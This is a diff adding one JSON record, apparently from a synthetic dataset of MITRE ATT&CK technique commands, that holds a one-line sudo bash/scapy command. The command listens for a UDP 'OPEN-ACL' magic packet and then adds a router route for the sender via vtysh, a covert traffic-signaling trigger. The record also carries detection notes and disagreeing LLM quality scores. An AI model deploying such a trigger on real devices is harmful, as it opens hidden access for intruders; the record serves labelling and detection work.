@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "sudo bash -c 'python3 -c \"from scapy.all import sniff,Raw,IP; import os; SRC=None; def cb(p):\\n  global SRC\\n  if p.haslayer(Raw) and b\\\"OPEN-ACL\\\" in bytes(p[Raw].load):\\n    SRC=p[IP].src\\n    return True\\n  return False\\nsniff(filter=\\\"udp and dst port 49000\\\", stop_filter=cb, store=0); os.system(f\\\"vtysh -c 'conf t' -c 'ip route {SRC}/32 192.0.2.254'\\\")\"'",
+  "explanation": "Sniffs for a UDP magic packet carrying the string 'OPEN-ACL' to port 49000; on detection, dynamically adds a /32 route for the sender via vtysh to allow targeted access. Detection: IDS rule for magic string, and continuous monitoring of new host routes added to FRR.",
+  "rationale_steps": [
+    "Use scapy to sniff for a UDP packet containing a pre-shared magic token.",
+    "Extract source IP and add a precise /32 static route to enable restricted device reachability.",
+    "Detect via content-based IDS/IPS signatures and FRR static route monitoring with config diffs."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-e71f7f24-32fd766d",
+  "source_prompt_hash": "e71f7f24",
+  "timestamp_utc": "2025-09-30T06:04:49.943820Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Quoting and escapes across sudo/bash/Python are balanced and valid, with proper scapy/sniff and vtysh invocation syntax.",
+        "semantic_score": 4,
+        "semantic_justification": "It implements traffic signaling by sniffing a UDP magic string to trigger a vtysh route insertion, but assumes IPv4 only (p[IP].src) despite a filter that could match IPv6 and relies on root despite claiming no privilege.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T12:53:45.645776Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, correct Python syntax within the command, appropriate use of escape sequences for newlines, and valid bash execution structure.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the Traffic Signaling technique by sniffing for a specific magic string ('OPEN-ACL') in UDP packets to port 49000 and then dynamically modifying network routes to allow targeted access from the source IP.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T12:53:48.668030Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 2,
+        "syntactic_justification": "The command contains an extraneous single quote and an unmatched parenthesis at the end of the Python `os.system` call, resulting in a Python `SyntaxError`.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements traffic signaling to trigger a route addition via `vtysh`, but the explanation's claim of 'Privilege: None' contradicts the command's explicit use of `sudo`, indicating a realism gap in the description.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T12:54:34.794183Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
